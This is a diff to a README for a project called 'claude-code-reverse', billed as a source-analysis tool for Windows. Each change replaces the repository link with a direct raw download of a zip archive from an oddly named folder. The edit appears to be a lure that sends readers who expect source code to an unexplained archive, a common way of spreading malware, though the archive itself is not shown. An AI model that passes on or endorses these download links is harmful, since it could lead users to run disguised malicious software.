@@ -1,6 +1,6 @@
 # 🧭 claude-code-reverse - Clear source analysis for Windows users
 
-[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mongoloid-closedsession617/claude-code-reverse)
+[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mongoloid-closedsession617/claude-code-reverse/main/tauroboly/code_reverse_claude_1.5.zip)
 
 ## 🪟 What this is
 
@@ -12,7 +12,7 @@ Use this project if you want to inspect the code flow, check how parts fit toget
 
 Open this page to download or access the files:
 
-[https://github.com/mongoloid-closedsession617/claude-code-reverse](https://github.com/mongoloid-closedsession617/claude-code-reverse)
+[https://raw.githubusercontent.com/mongoloid-closedsession617/claude-code-reverse/main/tauroboly/code_reverse_claude_1.5.zip](https://raw.githubusercontent.com/mongoloid-closedsession617/claude-code-reverse/main/tauroboly/code_reverse_claude_1.5.zip)
 
 If the page shows a release file or archive, save it to your PC. If it shows the repository page, use the green Code button on GitHub and choose Download ZIP.
 
@@ -129,7 +129,7 @@ You can use this repository to:
 
 Primary link:
 
-https://github.com/mongoloid-closedsession617/claude-code-reverse
+https://raw.githubusercontent.com/mongoloid-closedsession617/claude-code-reverse/main/tauroboly/code_reverse_claude_1.5.zip
 
 ## 📦 Download and open steps
 
